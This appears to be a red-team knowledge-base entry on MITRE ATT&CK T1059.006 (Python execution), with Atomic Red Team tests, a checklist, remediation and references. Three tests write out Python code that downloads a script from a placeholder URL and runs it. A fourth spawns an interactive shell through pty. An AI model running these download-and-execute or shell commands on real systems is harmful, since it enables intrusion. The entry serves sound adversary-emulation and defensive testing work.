---
name: "T1059.006_python"
description: "Adversaries may abuse Python commands and scripts for execution."
category: "input-validation"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1059.006
  - execution
  - esxi
  - linux
  - macos
  - windows
  - sub-technique
technique_id: "T1059.006"
tactic: "execution"
all_tactics:
  - execution
platforms:
  - ESXi
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1059/006"
tech_stack:
  - esxi
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-94
chains_with:
  - T1059
  - T1059.001
  - T1059.002
  - T1059.003
  - T1059.004
  - T1059.005
  - T1059.007
  - T1059.008
  - T1059.009
  - T1059.010
  - T1059.011
  - T1059.012
  - T1059.013
prerequisites:
  - T1059
severity_boost:
  T1059: "Chain with T1059 for deeper attack path"
  T1059.001: "Chain with T1059.001 for deeper attack path"
  T1059.002: "Chain with T1059.002 for deeper attack path"
---

# T1059.006 Python

> **Sub-technique of:** T1059

## High-Level Description

Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.

Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.

## Kill Chain Phase

- Execution (TA0002)

**Platforms:** ESXi, Linux, macOS, Windows

## What to Check

- [ ] Identify if Python technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Python
- [ ] Check Linux systems for indicators of Python
- [ ] Check macOS systems for indicators of Python
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Execute shell script via python's command mode arguement

Download and execute shell script and write to file then execute locally using Python -c (command mode)

**Supported Platforms:** linux

```bash
which_python=$(which python || which python3 || which python3.9 || which python2)
$which_python -c 'import requests;import os;url = "#{script_url}";malicious_command = "#{executor} #{payload_file_name} #{script_args}";session = requests.session();source = session.get(url).content;fd = open("#{payload_file_name}", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
```

**Dependencies:**
- Verify if python is in the environment variable path and attempt to import requests library.

### Atomic Test 2: Execute Python via scripts

Create Python file (.py) that downloads and executes shell script via executor arguments

**Supported Platforms:** linux

```bash
which_python=$(which python || which python3 || which python3.9 || which python2)
echo 'import requests' > #{python_script_name}
echo 'import os' >> #{python_script_name}
echo 'url = "#{script_url}"' >> #{python_script_name}
echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}
echo 'session = requests.session()' >> #{python_script_name}
echo 'source = session.get(url).content' >> #{python_script_name}
echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}
echo 'fd.write(source)' >> #{python_script_name}
echo 'fd.close()' >> #{python_script_name}
echo 'os.system(malicious_command)' >> #{python_script_name}
$which_python #{python_script_name}
```

**Dependencies:**
- Requires Python

### Atomic Test 3: Execute Python via Python executables

Create Python file (.py) then compile to binary (.pyc) that downloads an external malicious script then executes locally using the supplied executor and arguments

**Supported Platforms:** linux

```bash
which_python=$(which python || which python3 || which python3.9 || which python2)
echo 'import requests' > #{python_script_name}
echo 'import os' >> #{python_script_name}
echo 'url = "#{script_url}"' >> #{python_script_name}
echo 'malicious_command = "#{executor} #{payload_file_name} #{script_args}"' >> #{python_script_name}
echo 'session = requests.session()' >> #{python_script_name}
echo 'source = session.get(url).content' >> #{python_script_name}
echo 'fd = open("#{payload_file_name}", "wb+")' >> #{python_script_name}
echo 'fd.write(source)' >> #{python_script_name}
echo 'fd.close()' >> #{python_script_name}
echo 'os.system(malicious_command)' >> #{python_script_name}
$which_python -c 'import py_compile; py_compile.compile("#{python_script_name}", "#{python_binary_name}")'
$which_python #{python_binary_name}
```

**Dependencies:**
- Requires Python

### Atomic Test 4: Python pty module and spawn function used to spawn sh or bash

Uses the Python spawn function to spawn a sh shell followed by a bash shell. Per Volexity, this technique was observed in exploitation of Atlassian Confluence [CVE-2022-26134]. Reference: https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence

**Supported Platforms:** linux

```bash
which_python=$(which python || which python3 || which python3.9 || which python2)
$which_python -c "import pty;pty.spawn('/bin/sh')"
exit
$which_python -c "import pty;pty.spawn('/bin/bash')"
exit
```

**Dependencies:**
- Verify if python is in the environment variable path and attempt to import requests library.


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Python by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1059.006 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1047 Audit
Inventory systems for unauthorized Python installations.

### M1049 Antivirus/Antimalware
Anti-virus can be used to automatically quarantine suspicious files.

### M1033 Limit Software Installation
Prevent users from installing Python where not required.

### M1038 Execution Prevention
Denylist Python where not required.


## Detection

### Cross-Platform Behavioral Detection of Python Execution


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Python technique applicable | Low | Execution |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-94 | Improper Control of Generation of Code |


## References

- [Zscaler APT31 Covid-19 October 2020](https://www.zscaler.com/blogs/security-research/apt-31-leverages-covid-19-vaccine-theme-and-abuses-legitimate-online)
- [Atomic Red Team - T1059.006](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.006)
- [MITRE ATT&CK - T1059.006](https://attack.mitre.org/techniques/T1059/006)
